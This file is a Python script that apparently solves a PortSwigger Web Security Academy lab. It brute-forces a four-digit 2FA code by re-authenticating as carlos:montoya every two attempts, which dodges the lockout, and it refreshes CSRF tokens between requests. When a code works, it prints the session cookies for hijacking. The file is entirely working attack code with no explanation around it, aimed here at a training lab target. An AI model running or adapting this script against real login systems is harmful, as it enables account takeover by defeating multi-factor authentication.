# https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
import requests
import re
import utils

session = requests.Session()

base_url = 'https://ac801fe21e8234fc80920b1900b300e4.web-security-academy.net'
csrf = ''


# go to login page and get csrf
url = '%s/login' % base_url
request_result = session.get(url)

csrf = utils.csrf_from_response_text(request_result.text)

code_submit_count = 0
for c in range(10000):
    code = '%04d' % c

    if code_submit_count % 2 == 0:
        # login as carlos:montoya
        print('logging in as carlos:montoya')
        username = 'carlos'
        password = 'montoya'

        url = '%s/login' % base_url
        request_result = session.post(
            url, data='csrf=%s&username=%s&password=%s' % (csrf, username, password), verify=False)

        if 'Please enter your 4-digit security code' not in request_result.text:
            exit('login err')

        csrf = utils.csrf_from_response_text(request_result.text)

    # submit 2fa code
    print('trying code %s' % code)
    url = '%s/login2' % base_url
    request_result = session.post(
        url, data='csrf=%s&mfa-code=%s' % (csrf, code), verify=False)

    if 'Incorrect security code' not in request_result.text:
        print('logged in with code %s' % code)

        # inject cookies and you're in
        print('cookies: %s' % session.cookies.get_dict())
        exit()

    csrf = utils.csrf_from_response_text(request_result.text)

    code_submit_count += 1
